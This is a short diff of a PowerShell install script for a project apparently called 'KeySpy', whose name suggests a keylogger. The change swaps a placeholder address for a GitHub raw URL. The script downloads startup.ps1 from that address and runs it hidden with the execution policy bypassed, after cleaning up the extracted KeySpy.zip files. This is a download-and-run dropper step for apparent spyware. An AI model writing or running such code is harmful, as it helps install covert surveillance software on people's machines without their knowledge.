@@ -34,7 +34,7 @@ Remove-Item -Path "$destinationFolder\$($extractedFolder.Name)" -Recurse -Force
 Remove-Item "$destinationFolder\KeySpy.zip" -Force
 
 # Download the startup.ps1 file and save it in the same folder
-Invoke-WebRequest -Uri "https://example.com/startup.ps1" -OutFile "$destinationFolder\startup.ps1" -UseBasicParsing
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/startup.ps1" -OutFile "$destinationFolder\startup.ps1" -UseBasicParsing
 
 # Execute the startup.ps1 script silently
 Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File '$destinationFolder\startup.ps1'" -NoNewWindow -Wait
